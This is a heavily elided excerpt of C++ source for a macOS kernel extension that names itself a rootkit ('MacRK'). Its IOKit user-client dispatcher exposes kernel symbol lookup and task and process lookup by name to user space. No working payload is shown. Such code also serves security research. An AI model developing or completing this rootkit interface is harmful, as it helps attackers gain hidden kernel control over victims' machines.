...
bool IOKernelDarwinKitUserClient::start(IOService* provider) {
    IOKernelDarwinKitService* service = kernel->getRootKitService();

    rootkitService = service;
...
IOReturn IOKernelDarwinKitUserClient::externalMethod(UInt32 selector,
    ...
    DARWIN_RK_LOG("MacRK::IOKernelDarwinKitUserClient::externalMethod() called!\n");
    ...
    case kIOKernelDarwinKitGetKextSymbol:;
        ...
        if (arguments) {
            if (arguments->scalarInputCount == 4) {
                ...
                xnu::Kext* kext =
                    getRootKitService()->getRootKit()->getKextByIdentifier(kextidentifier);
    ...
    case kIOKernelDarwinKitGetTaskByName:;
        ...
        if (arguments) {
            if (arguments->scalarInputCount == 2) {
                ...
                DARWIN_RK_LOG("MacRK::finding task with name = 0x%llx\n", (UInt64)(name));
    ...
    case kIOKernelDarwinKitGetProcByName:;
        ...
        if (arguments) {
            if (arguments->scalarInputCount == 2) {
                ...
                DARWIN_RK_LOG("MacRK::finding proc with 0x%llx\n", (UInt64)(name));
